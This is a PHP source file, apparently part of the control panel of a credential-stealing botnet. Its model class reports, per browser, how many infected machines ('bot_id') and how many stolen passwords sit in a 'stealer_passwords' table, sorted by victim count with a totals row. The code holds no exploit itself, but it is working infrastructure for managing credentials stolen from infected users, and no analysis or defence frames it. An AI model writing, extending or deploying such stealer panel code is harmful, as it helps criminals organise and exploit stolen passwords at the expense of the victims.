<?php

class Model_Browsers extends Model
{

    public function get_data()
    {

    }
    public function getBrowserStats()
    {
        $outStats = array();
        $browsers = $this->getDB()->queryValues('SELECT DISTINCT browser FROM stealer_passwords');
        $usersAll = 0;
        $passwordsAll = 0;
        foreach ($browsers as $index => $browser)
        {
            $outStats[$index]['browser'] = htmlspecialchars($browser);
            $count = $this->getDB()->queryRow('SELECT COUNT(DISTINCT bot_id) as users_count, COUNT(*) as passwords_count FROM stealer_passwords WHERE browser=:browser',
                array(':browser' => $browser));
            $outStats[$index]['users_count'] = $count['users_count'];
            $outStats[$index]['passwords_count'] = $count['passwords_count'];
            $usersAll += $count['users_count'];
            $passwordsAll += $count['passwords_count'];
        }
        uasort($outStats, array($this, 'cmp_browser_function_desc'));
        $outStats[] = array(
            'browser' => '<b>All</b>',
            'users_count' => '<b>' . $usersAll . '</b>',
            'passwords_count' => '<b>' . $passwordsAll . '</b>');
        return $outStats;
    }

    private function cmp_browser_function_desc($a, $b){
        return ($a['users_count'] < $b['users_count']);
    }


}